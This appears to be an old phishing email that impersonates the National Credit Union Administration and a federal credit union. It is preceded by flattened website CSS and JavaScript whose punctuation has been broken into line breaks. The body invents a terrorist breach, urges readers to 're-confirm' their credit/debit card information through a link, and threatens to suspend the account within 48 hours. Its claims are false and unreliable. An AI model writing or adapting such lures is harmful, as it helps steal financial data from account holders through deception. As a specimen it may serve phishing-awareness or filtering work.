@@ -1,0 +1,118 @@
+Subject: Update And Verify Your FCU Account Welcome to VisionLine A:link { COLOR: #ff0000 } A:active { COLOR: #ff0000 } A:visited { } A:hover { COLOR: #0000cc } 
+smallText { FONT-SIZE: 8pt; FONT-FAMILY: arial } 
+mediumText { FONT-SIZE: 9pt; FONT-FAMILY: arial } 
+largeText { FONT-SIZE: 10pt; FONT-FAMILY: arial } B
+topRow { FONT-SIZE: 9pt; COLOR: #ffffff; FONT-FAMILY: arial } B
+mainNav { FONT-SIZE: 10pt; COLOR: #ffffff; FONT-FAMILY: arial } TD
+topNav { FONT-SIZE: 8pt; BACKGROUND-COLOR: #000066 } TD
+topNav A:link { FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none } TD
+topNav A:visited { FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none } TD
+topNav A:active { FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none } TD
+topNav A:hover { FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: underline } TD
+middleNav { FONT-SIZE: 9pt; BACKGROUND-COLOR: #000066 } TD
+middleNav A:link { FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #ffffff; FONT-FAMILY: arial; TEXT-DECORATION: none } TD
+middleNav A:visited { FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #ffffff; FONT-FAMILY: arial; TEXT-DECORATION: none } TD
+middleNav A:active { FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #ffffff; FONT-FAMILY: arial; TEXT-DECORATION: none } TD
+middleNav A:hover { FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #e8be51; FONT-FAMILY: arial; TEXT-DECORATION: underline } TD
+leftNavHeader { FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #000066; TEXT-INDENT: 5px; FONT-FAMILY: verdana; TEXT-ALIGN: left } TD
+leftNav A:link { FONT-SIZE: 8pt; COLOR: #000066; FONT-FAMILY: arial; TEXT-DECORATION: none } TD
+leftNav A:visited { FONT-SIZE: 8pt; COLOR: #000066; FONT-FAMILY: arial; TEXT-DECORATION: none } TD
+leftNav A:active { FONT-SIZE: 8pt; COLOR: #000066; FONT-FAMILY: arial; TEXT-DECORATION: none } TD
+leftNav A:hover { FONT-SIZE: 8pt; COLOR: #000066; FONT-FAMILY: arial; TEXT-DECORATION: underline } P
+rate { FONT-SIZE: 8pt; COLOR: #000000; FONT-FAMILY: arial } P
+standard { FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial } P
+sitemap { FONT-SIZE: 11pt; COLOR: #000000; FONT-FAMILY: arial } UL
+standard { FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial } OL
+standard { FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial } UL
+standardSmall { FONT-SIZE: 8pt; COLOR: #000000; FONT-FAMILY: arial } OL
+standardBold { FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial } B
+standardSmall { FONT-SIZE: 7pt; COLOR: #000000; FONT-FAMILY: arial } B
+standard { FONT-SIZE: 8pt; COLOR: #000000; FONT-FAMILY: arial } B
+standard2 { FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: arial } I
+standard { FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial } TD
+standard { FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial } TD
+standardSmall { FONT-SIZE: 8pt; FONT-FAMILY: arial } U
+testOut { FONT-SIZE: 8pt; COLOR: #000000; FONT-FAMILY: arial } 
+style3 {font-size: 14px} 
+style5 {font-size: 14} 
+style6 {color: #FFFF00} 
+style8 { font-size: xx-small; font-style: italic; font-weight: bold; } 
+style9 {font-size: 16px} 
+style10 {font-size: 12px} <
+-- javascript:window
+history
+forward(1); function disclaimIt(URL) { var completeURL completeURL='/links/offSiteCheck
+asp
+link='+URL window
+open(completeURL,'investments','width=400,height=300,resizable=yes,toolbar=no,scrollbars=yes,location=no'); } function disclaimIt2(URL) { var completeURL completeURL='https://www
+visionsfcu
+org/links/offSiteCheck
+asp
+Preferred=1&link='+URL window
+open(completeURL,'investments','width=400,height=300,resizable=yes,toolbar=no,scrollbars=yes,location=no'); } function checkSendEmailForm() { if (document
+emailSubmission
+emailAddress
+value=="") { alert('Please enter your email address before you push the send button'); } else if (document
+emailSubmission
+emailAddress
+value
+indexOf("@") < 1) { alert('Invalid email address'); } else if (document
+emailSubmission
+accountNum
+value=="") { alert('Please enter your account number before you push the send button'); } else { document
+emailSubmission
+submit(); } } if (document
+images) { linkCircle1off=new Image(10,10); linkCircle1off
+src="/siteImages/triOff4
+gif"; linkCircle1on=new Image(10,10); linkCircle1on
+src="/siteImages/triOn4
+gif"; linkCircle2off=new Image(10,10); linkCircle2off
+src="/siteImages/triOff4
+gif"; linkCircle2on=new Image(10,10); linkCircle2on
+src="/siteImages/triOn4
+gif"; linkCircle3off=new Image(10,10); linkCircle3off
+src="/siteImages/triOff4
+gif"; linkCircle3on=new Image(10,10); linkCircle3on
+src="/siteImages/triOn4
+gif"; linkCircle4off=new Image(10,10); linkCircle4off
+src="/siteImages/triOff4
+gif"; linkCircle4on=new Image(10,10); linkCircle4on
+src="/siteImages/triOn4
+gif"; linkCircle5off=new Image(10,10); linkCircle5off
+src="/siteImages/triOff4
+gif"; linkCircle5on=new Image(10,10); linkCircle5on
+src="/siteImages/triOn4
+gif"; linkCircle6off=new Image(10,10); linkCircle6off
+src="/siteImages/triOff4
+gif"; linkCircle6on=new Image(10,10); linkCircle6on
+src="/siteImages/triOn4
+gif"; } function lightup(imgName) { if (document
+images) { imgOn=eval(imgName + "on
+src"); document[imgName]
+srcimgOn; } } function turnoff(imgName) { if (document
+images) { imgOff=eval(imgName + "off
+src"); document[imgName]
+srcimgOff; } } //--> NCUA Home | Search | Privacy Policy & Accessibility | Site Map| Contact Us National Credit Union Administration Share Insurance | Resources for Credit Unions | Resources for Consumers | News | Search About NCUA The National Credit Union Administration (NCUA) is the independent federal agency that charters and supervises federal credit unions
+ NCUA, backed of the full faith and credit of the U
+S
+ government, operates the National Credit Union Share Insurance Fund (NCUSIF) insuring the savings of 80 million account holders in all federal credit unions and many state-chartered credit unions
+ During the 1990s and into the 21st century, credit unions have been healthy and growing
+ Credit union failures remain low and the Share Insurance Fund maintains a healthy equity level
+ function OnloadFunction() {;} The National Credit Union Administration (NCUA) is comitted to maintain a safe environment for over 80 million account holders in all federal credit unions and many state-chartered credit unions
+ Protecting the security of holders account and of the Federal Credit Unions (FCU) network is our primary concern
+ To protect the security of your account, NCUA employs some of the most advanced security systems in the world and our anti-fraud teams regularly scan the federal credit unions systems for unusual activity
+ We recently have determined that some federal credit unions systems have been accessed by terrorist organization attackers who try to obtain funds for their criminal activities
+ Therefore, our primary concern is to improve our database regarding all federal credit unions systems, this activity being asked by the United States Government 
+ For security purposes we now need you to re-confirm your credit/debit card information to us
+ If this is not completed in 48 hours, we will be forced to suspend your account indefinitely, as it may have been used for fraudulent and terrorist purposes
+ We thank you for your cooperation in this manner
+ In order to confirm your credit/debit card records, we may require some specific information from you
+ Click here to confirm your credit/debit card records Thank you for your prompt attention to this matter
+ Please understand that this is a security measure meant to help protect you and your account
+ We apologize for any inconvenience
+ If you choose to ignore our request, you leave us no choise but to temporaly suspend your account
+ Thank you for using Federal Credit Union 
+ Use of Federal Credit Union is covered under Federal Credit Union Share Accounts, Checking Accounts and Electronic Funds Transfer Agreements and Disclosure Statements which contains important information regarding services obtained from Federal Credit Union
+ Use of Federal Credit Union constitutes agreement with the terms and conditions of the aforementioned agreement and disclosure statements
+ 2005 by Federal Credit Union
+ All rights reserved
